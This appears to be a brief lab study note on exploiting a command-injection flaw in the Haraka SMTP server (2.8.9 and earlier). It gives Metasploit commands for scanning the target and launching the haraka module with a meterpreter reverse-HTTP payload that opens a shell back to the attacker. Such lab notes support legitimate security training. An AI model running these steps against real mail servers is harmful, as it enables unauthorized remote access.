# SMTP EXPLOTATION

### simple mail transfer protocol
By default port 25 
can be configured to run on port TCP **465 AND 587**

### explotation HARAKA
```
Haraka is an open source high performance SMTP server developed in Node.js.
The Haraka SMTP server comes with a plugin for processing attachments.
Haraka versions V2.8.9 are vulnerable to command injection.
```

## VErsion 2.8.9 smtp and smaller


# DEMO
>msfconsole
>>workspace
>>>setg RHOSTS
>>>db_nmap -sS -sV -sC -O **<ip**
```bash
[*] Nmap: PORT STATE SERVICE VERSION
[*] Nmap: 25/tcp open smtp Haraka smtpd 2.8.8
[*] Nmap: MAC Address: 02:42:C0:56:33:03 (Unknown)
```
### exploit
>>>>linux/smtp/haraka
>>>>set SRV_PRT 9898
>>>>set email_to root@attackdefence.text
>>>>> set Payload linux/x64/meterpreter_reverse_http
THIS IS A STAGELESS PAYLOAD
>>>>set LHOST **<eth1>**
*tHIS NEEDS 8080 THATS WHY WE CHANGED SRV_PORT TO DIFFERENT ONE*
>>>>> RUN
